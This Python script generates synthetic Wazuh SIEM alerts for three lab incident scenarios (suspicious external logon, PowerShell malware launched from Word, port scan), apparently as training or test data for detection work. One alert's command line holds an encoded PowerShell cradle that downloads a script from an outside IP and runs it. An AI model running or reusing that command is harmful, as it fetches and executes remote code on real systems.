# -*- coding: utf-8 -*-
"""
scripts/generate_wazuh_datasets.py
Sinh dữ liệu cảnh báo chuẩn Wazuh SIEM (alerts.json) cho 3 kịch bản sự cố EVE-NG.
"""

import os
import json

def generate_wazuh_datasets():
    output_dir = os.path.join(os.path.dirname(__file__), "..", "data", "raw", "wazuh")
    os.makedirs(output_dir, exist_ok=True)

    # 1. Kịch bản 1: Phishing Credential Access (Wazuh Rule 60106 / Windows Event 4624 Logon Type 3 from External IP)
    phishing_alert = {
        "timestamp": "2026-10-15T08:22:15.000+0000",
        "rule": {
            "level": 10,
            "description": "Windows logon success from unusual external IP address",
            "id": "60106",
            "mitre": {
                "id": ["T1078.002"],
                "tactic": ["Initial Access", "Defense Evasion"],
                "technique": ["Valid Accounts: Domain Accounts"]
            },
            "groups": ["windows", "authentication_success"]
        },
        "agent": {
            "id": "002",
            "name": "WIN10-VICTIM-01",
            "ip": "192.168.1.105"
        },
        "id": "1760516535.1001",
        "full_log": "Event 4624: An account was successfully logged on",
        "data": {
            "win": {
                "system": {
                    "eventID": "4624",
                    "computer": "WIN10-VICTIM-01"
                },
                "eventdata": {
                    "targetUserName": "hoainam",
                    "targetDomainName": "HCMUTE",
                    "logonType": "3",
                    "ipAddress": "185.220.101.5",
                    "ipPort": "49812",
                    "authenticationPackageName": "NTLM"
                }
            }
        }
    }

    # 2. Kịch bản 2: Endpoint Malware (Wazuh Rule 92211 / Sysmon Event ID 1 & 3: powershell.exe -enc)
    malware_alert = {
        "timestamp": "2026-10-15T09:30:12.000+0000",
        "rule": {
            "level": 12,
            "description": "Sysmon - Event 1: Suspicious Process creation by powershell.exe with encoded payload",
            "id": "92211",
            "mitre": {
                "id": ["T1059.001", "T1027"],
                "tactic": ["Execution", "Defense Evasion"],
                "technique": ["Command and Scripting Interpreter: PowerShell", "Obfuscated Files or Information"]
            },
            "groups": ["windows", "sysmon", "sysmon_process_creation"]
        },
        "agent": {
            "id": "002",
            "name": "WIN10-VICTIM-01",
            "ip": "192.168.1.105"
        },
        "id": "1760520612.2001",
        "full_log": "Sysmon Event 1: Process Creation: powershell.exe",
        "data": {
            "win": {
                "system": {
                    "eventID": "1",
                    "computer": "WIN10-VICTIM-01"
                },
                "eventdata": {
                    "image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "commandLine": r"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEAMgAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
                    "parentImage": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                    "parentCommandLine": "WINWORD.EXE",
                    "hashes": "SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91",
                    "user": r"HCMUTE\truongdo",
                    "destinationIp": "194.26.29.112",
                    "destinationPort": "443"
                }
            }
        }
    }

    # 3. Kịch bản 3: Network Reconnaissance (Wazuh Rule 5710 / Multiple Connection Attempts / Scan)
    network_scan_alert = {
        "timestamp": "2026-10-15T10:05:00.000+0000",
        "rule": {
            "level": 8,
            "description": "Network Port Scanning activity detected - multiple SYN packets sent to closed ports",
            "id": "5710",
            "mitre": {
                "id": ["T1046"],
                "tactic": ["Discovery"],
                "technique": ["Network Service Discovery"]
            },
            "groups": ["firewall", "network_scan", "ids"]
        },
        "agent": {
            "id": "001",
            "name": "PFSENSE-GATEWAY",
            "ip": "192.168.1.1"
        },
        "id": "1760522700.3001",
        "full_log": "Firewall block: multiple SYN dropped from 192.168.1.200 to 192.168.1.105 ports 445, 3389, 22",
        "data": {
            "win": {
                "system": {
                    "eventID": "NetScan-01",
                    "computer": "PFSENSE-GATEWAY"
                },
                "eventdata": {
                    "sourceIp": "192.168.1.200",
                    "destinationIp": "192.168.1.105",
                    "destinationPort": "445",
                    "protocol": "tcp"
                }
            }
        }
    }

    files = [
        ("wazuh_alerts_scenario1_phishing.json", [phishing_alert]),
        ("wazuh_alerts_scenario2_malware.json", [malware_alert]),
        ("wazuh_alerts_scenario3_network_scan.json", [network_scan_alert]),
    ]

    for fname, data in files:
        fpath = os.path.join(output_dir, fname)
        with open(fpath, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        print(f"Generated Wazuh dataset: {fpath}")

if __name__ == "__main__":
    generate_wazuh_datasets()
